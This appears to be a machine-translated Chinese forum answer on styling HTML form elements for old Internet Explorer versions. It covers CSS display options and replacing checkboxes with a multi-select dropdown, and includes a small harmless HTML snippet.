进行格式化的“正确”方法基本上`div`是 s 或`fieldset`s 然后是`style`属性。各种`display`选项可能是您想要的（`inline`并且`inline-block`可能是最有用的，但也可能是最有用的，`table`具体取决于您必须支持的 IE 版本）- 阅读[此处以了解您可以使用的内容](http://www.quirksmode.org/css/display.html)，尽管可能有一些设置高度的诡计和宽度。

老的：

可以用多选界面代替复选框界面吗？这可能是解决...繁琐...IE实现的一种方法。那是：

```
<select multiple name="DealerType">
<option value="1">GM</option>
//...etc
</select> 
```

此外，从您的示例中，您的隐藏元素没有关闭（以`/>`而不是终止`>`）。根据您正在处理的 IE，这可能是问题的一部分。

另一个澄清评论：您使用的是什么版本的 jQ？